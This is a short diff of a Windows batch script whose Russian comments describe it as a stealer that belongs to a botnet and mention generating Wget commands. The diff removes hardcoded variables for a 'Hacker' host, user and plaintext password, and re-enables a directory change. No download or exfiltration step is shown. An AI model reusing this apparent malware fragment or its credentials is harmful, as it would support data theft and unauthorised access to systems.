@@ -6,11 +6,6 @@ rem только при прекращении работы стайлера,
 rem и одну переменную часть, которая напрямую не связана с работой стайлера и которую
 rem можно менять.
 
-REM TEST
-set Hacker_host2=yuden.server.grandkozel.ru
-set Hacker_User=yuden
-set Hacker_Pass=0a9s8d7F
-
 Rem !!! Обязательная часть ботнета 1
 
 rem Загружаем пользовательские файлы, специфичные для пользователя
@@ -35,7 +30,7 @@ set LocalFolder=%PUB1%\Util
  
 rem Переходим в каталог сервера
 
-rem cd /d %LocalFolder%
+cd /d %LocalFolder%
  
 rem Генерируем Wget команды
 
